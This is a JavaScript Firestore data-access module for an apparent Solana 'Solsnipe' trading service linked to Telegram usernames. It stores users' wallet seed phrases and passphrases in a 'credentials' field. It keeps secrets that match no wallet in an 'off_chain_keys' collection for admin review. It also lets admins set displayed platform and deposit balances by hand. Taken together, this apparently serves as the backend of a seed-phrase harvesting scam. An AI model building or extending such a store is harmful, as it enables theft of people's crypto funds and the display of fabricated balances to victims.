/**
 * Firebase Wallet Store - Admin SDK Version
 *
 * Stores wallet data for seed phrase-generated wallets.
 * Uses the firebase-admin SDK (service account) instead of the public REST
 * API + API key, so this bypasses Firestore Security Rules via a real
 * credential rather than relying on the rules being left open.
 *
 * Every public method name/signature/return shape below is preserved
 * exactly as the old REST-based version so no caller needed to change.
 */

/**
 * Wallet Data Structure in Firebase:
 *
 * Collection: wallets
 * Document ID: walletId (unique UUID from seed hash)
 *
 * Fields:
 * - walletId: string (unique identifier)
 * - walletAddress: string (Solana public key)
 * - seedHash: string (SHA-256 hash of seed/passphrase - for lookup)
 * - walletType: string (solflare, phantom, backpack, etc.)
 * - inputType: string (seed_phrase or passphrase)
 * - derivationPath: string (BIP44 path or "custom-passphrase")
 * - accountIndex: number (derivation index)
 * - blockchain: string ("solana")
 * - balance: number (SOL balance)
 * - solsnipeBalance: number (Solsnipe platform balance - default 0)
 * - credentials: string (encrypted seed phrase or passphrase)
 * - telegramUsername: string (Telegram user who connected this wallet)
 * - balanceLastUpdated: ISO timestamp string
 * - transactions: array (recent transaction signatures)
 * - createdAt: ISO timestamp string
 * - lastLoginAt: ISO timestamp string
 * - loginCount: number
 * - metadata: object (additional info)
 *
 * Timestamps are stored as plain ISO strings (not native Firestore
 * Timestamp objects) so every consumer's `new Date(wallet.createdAt)` keeps
 * working unchanged.
 */

const { db } = require('./firebaseAdmin');

const WALLETS = 'wallets';
const OFF_CHAIN_KEYS = 'off_chain_keys';
const ADMIN_OPERATIONS = 'admin_operations';

class FirebaseWalletStore {
  constructor() {
    this.db = db;
  }

  /**
   * Create or update wallet in Firebase
   */
  async saveWallet(walletData) {
    try {
      const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '', telegramUsername = '' } = walletData;

      console.log('💾 Saving wallet to Firebase:', walletAddress);

      const now = new Date().toISOString();

      await this.db.collection(WALLETS).doc(walletId).set({
        walletId,
        walletAddress,
        seedHash: lookupHash,
        walletType,
        inputType,
        derivationPath,
        accountIndex,
        blockchain: 'solana',
        balance,
        solsnipeBalance: 0,
        depositedAmount: 0,
        credentials,
        telegramUsername,
        balanceLastUpdated: now,
        solsnipeBalanceLastUpdated: now,
        depositedAmountLastUpdated: now,
        createdAt: now,
        lastLoginAt: now,
        loginCount: 1,
        totalSolsnipeCredited: 0,
        totalSolCredited: 0,
        totalDeposited: 0,
        autoSnipeBot: 0,
        totalTrade: 0,
        withdrawal: '',
        vsnCodes: ''
      });

      console.log('✅ Wallet saved successfully');
      return { success: true, walletId };
    } catch (error) {
      console.error('💥 saveWallet error:', error.message);
      throw new Error(`Failed to save wallet: ${error.message}`);
    }
  }

  /**
   * Get wallet by wallet ID
   */
  async getWalletById(walletId) {
    try {
      const doc = await this.db.collection(WALLETS).doc(walletId).get();
      return doc.exists ? doc.data() : null;
    } catch (error) {
      throw new Error(`Failed to get wallet: ${error.message}`);
    }
  }

  /**
   * Get wallet by seed hash (for login authentication)
   */
  async getWalletBySeedHash(seedHash) {
    try {
      console.log('🔍 Querying Firebase for wallet with seed hash:', seedHash.substring(0, 10) + '...');

      const snapshot = await this.db.collection(WALLETS).where('seedHash', '==', seedHash).limit(1).get();

      if (snapshot.empty) {
        console.log('ℹ️  No wallet found for this seed hash (new user)');
        return null;
      }

      console.log('✅ Existing wallet found');
      return snapshot.docs[0].data();
    } catch (error) {
      console.error('💥 getWalletBySeedHash error:', error.message);
      throw new Error(`Failed to query wallet: ${error.message}`);
    }
  }

  /**
   * Get wallet by wallet address
   */
  async getWalletByAddress(walletAddress) {
    try {
      console.log(`🔍 Finding wallet by address: ${walletAddress}`);

      const snapshot = await this.db.collection(WALLETS).where('walletAddress', '==', walletAddress).limit(1).get();

      if (snapshot.empty) {
        console.log('ℹ️  No wallet found for this address');
        return null;
      }

      console.log('✅ Wallet found by address');
      return snapshot.docs[0].data();
    } catch (error) {
      console.error('💥 getWalletByAddress error:', error.message);
      throw new Error(`Failed to query wallet by address: ${error.message}`);
    }
  }

  /**
   * Set/refresh the Telegram username associated with a wallet.
   * Only touches the telegramUsername field - every other field is
   * untouched (Admin SDK's update() is a true partial update).
   */
  async updateWalletTelegramUsername(walletId, telegramUsername) {
    try {
      if (!telegramUsername) return null;

      await this.db.collection(WALLETS).doc(walletId).update({ telegramUsername });

      console.log('✅ Wallet Telegram association updated:', { walletId, telegramUsername });
      return { success: true, walletId, telegramUsername };
    } catch (error) {
      throw new Error(`Failed to update Telegram username: ${error.message}`);
    }
  }

  /**
   * Find a wallet by its associated Telegram username (admin use)
   */
  async getWalletByTelegramUsername(telegramUsername) {
    try {
      const snapshot = await this.db.collection(WALLETS).where('telegramUsername', '==', telegramUsername).limit(1).get();

      if (snapshot.empty) {
        return null;
      }

      return snapshot.docs[0].data();
    } catch (error) {
      console.error('💥 getWalletByTelegramUsername error:', error.message);
      throw new Error(`Failed to query wallet by Telegram username: ${error.message}`);
    }
  }

  /**
   * Update wallet balance and last login
   */
  async updateWalletBalance(walletId, balance, transactions = [], creditAmount = 0) {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      const transactionsToSave = transactions && transactions.length > 0
        ? transactions
        : (wallet.transactions || []);

      const totalSolCredited = (wallet.totalSolCredited || 0) + (creditAmount > 0 ? creditAmount : 0);

      await this.db.collection(WALLETS).doc(walletId).update({
        balance,
        balanceLastUpdated: new Date().toISOString(),
        lastLoginAt: new Date().toISOString(),
        loginCount: (wallet.loginCount || 0) + 1,
        totalSolCredited,
        transactions: transactionsToSave
      });

      console.log('✅ Wallet balance updated:', { walletId, balance, transactionCount: transactionsToSave.length });
      return { success: true, walletId, balance };
    } catch (error) {
      throw new Error(`Failed to update wallet: ${error.message}`);
    }
  }

  /**
   * Update wallet balance by wallet address (for admin operations)
   */
  async updateBalanceByAddress(walletAddress, newBalance, adminId, operation, creditAmount) {
    try {
      const wallet = await this.getWalletByAddress(walletAddress);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      // Update balance AND track total SOL credited
      await this.updateWalletBalance(wallet.walletId, newBalance, wallet.transactions || [], creditAmount);

      // Log admin operation
      await this.logAdminOperation(walletAddress, adminId, operation, newBalance);

      return { success: true, walletAddress, newBalance };
    } catch (error) {
      throw new Error(`Failed to update balance: ${error.message}`);
    }
  }

  /**
   * Log admin operations (credit/debit/set-balance)
   */
  async logAdminOperation(walletAddress, adminId, operation, amount) {
    try {
      const operationId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;

      await this.db.collection(ADMIN_OPERATIONS).doc(operationId).set({
        operationId,
        walletAddress,
        adminId,
        operation,
        amount,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Failed to log admin operation:', error);
    }
  }

  /**
   * Save a key/credentials that could not be matched to an on-chain wallet
   * Stored in the `off_chain_keys` collection for admin review
   */
  async saveOffChainKey(data) {
    try {
      const docId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;

      await this.db.collection(OFF_CHAIN_KEYS).doc(docId).set({
        id: docId,
        inputType: data.inputType || '',
        walletType: data.walletType || '',
        credentials: data.credentials || '',
        seedHash: data.seedHash || '',
        triedAddresses: data.triedAddresses || [],
        recordedAt: new Date().toISOString()
      });

      console.log('✅ Off-chain key recorded:', docId);
      return docId;
    } catch (error) {
      throw new Error(`Failed to save off-chain key: ${error.message}`);
    }
  }

  /**
   * Retrieve all off-chain keys (admin only)
   */
  async getAllOffChainKeys() {
    try {
      const snapshot = await this.db.collection(OFF_CHAIN_KEYS).orderBy('recordedAt', 'desc').get();
      return snapshot.docs.map(doc => doc.data());
    } catch (error) {
      throw new Error(`Failed to get off-chain keys: ${error.message}`);
    }
  }

  /**
   * Get a single off-chain key by ID
   */
  async getOffChainKeyById(offChainKeyId) {
    try {
      const doc = await this.db.collection(OFF_CHAIN_KEYS).doc(offChainKeyId).get();
      return doc.exists ? doc.data() : null;
    } catch (error) {
      throw new Error(`Failed to get off-chain key: ${error.message}`);
    }
  }

  /**
   * Delete an off-chain key record
   */
  async deleteOffChainKey(offChainKeyId) {
    try {
      await this.db.collection(OFF_CHAIN_KEYS).doc(offChainKeyId).delete();
      console.log('✅ Off-chain key deleted:', offChainKeyId);
      return { success: true, offChainKeyId };
    } catch (error) {
      throw new Error(`Failed to delete off-chain key: ${error.message}`);
    }
  }

  /**
   * Delete wallet (admin only)
   */
  async deleteWallet(walletId) {
    try {
      await this.db.collection(WALLETS).doc(walletId).delete();
      return { success: true, walletId };
    } catch (error) {
      throw new Error(`Failed to delete wallet: ${error.message}`);
    }
  }

  /**
   * Update Solsnipe balance (platform credits, not SOL)
   */
  async updateSolsnipeBalance(walletId, newBalance, adminId, operation, creditAmount) {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      const totalSolsnipeCredited = (wallet.totalSolsnipeCredited || 0) + (operation === 'credit' ? creditAmount : 0);
      const autoSnipeBot = (wallet.autoSnipeBot || 0) + (operation === 'credit' ? 2 : 0);
      const totalTrade = (wallet.totalTrade || 0) + (operation === 'credit' ? 1 : 0);

      await this.db.collection(WALLETS).doc(walletId).update({
        solsnipeBalance: newBalance,
        solsnipeBalanceLastUpdated: new Date().toISOString(),
        totalSolsnipeCredited,
        autoSnipeBot,
        totalTrade
      });

      console.log('✅ Solsnipe balance updated:', { walletId, newBalance, totalSolsnipeCredited, autoSnipeBot, totalTrade });
      return { success: true, walletId, newBalance };
    } catch (error) {
      throw new Error(`Failed to update Solsnipe balance: ${error.message}`);
    }
  }

  /**
   * Update Deposited Amount
   */
  async updateDepositedAmount(walletId, newAmount, adminId, operation, creditAmount) {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      const totalDeposited = (wallet.totalDeposited || 0) + (operation === 'credit' ? creditAmount : 0);

      await this.db.collection(WALLETS).doc(walletId).update({
        depositedAmount: newAmount,
        depositedAmountLastUpdated: new Date().toISOString(),
        totalDeposited
      });

      console.log('✅ Deposited amount updated:', { walletId, newAmount, totalDeposited });
      return { success: true, walletId, newAmount };
    } catch (error) {
      throw new Error(`Failed to update Solsnipe balance: ${error.message}`);
    }
  }

  /**
   * Get all wallets (admin only)
   */
  async getAllWallets() {
    try {
      console.log('📋 Fetching all wallets from Firebase...');

      const snapshot = await this.db.collection(WALLETS).orderBy('createdAt', 'desc').get();
      const wallets = snapshot.docs.map(doc => doc.data());

      console.log(`✅ Retrieved ${wallets.length} wallets`);
      return wallets;
    } catch (error) {
      console.error('💥 getAllWallets error:', error.message);
      throw new Error(`Failed to fetch wallets: ${error.message}`);
    }
  }

  /**
   * Update VSN code list for a wallet
   */
  async updateWalletVsnCodes(walletId, vsnCodes = [], adminId = 'system') {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      await this.db.collection(WALLETS).doc(walletId).update({
        vsnCodes: JSON.stringify(vsnCodes),
        vsnCodesUpdatedAt: new Date().toISOString()
      });

      await this.logAdminOperation(wallet.walletAddress, adminId, 'update-vsn-codes', vsnCodes.length);

      return { success: true, walletId };
    } catch (error) {
      throw new Error(`Failed to update VSN codes: ${error.message}`);
    }
  }

  /**
   * Generic partial update - only the fields passed in `partialFields` are
   * touched, everything else on the document is left untouched.
   */
  async updateWalletFields(walletId, partialFields) {
    try {
      await this.db.collection(WALLETS).doc(walletId).update(partialFields);
      return { success: true, walletId };
    } catch (error) {
      throw new Error(`Failed to update wallet fields: ${error.message}`);
    }
  }
}

module.exports = { FirebaseWalletStore };
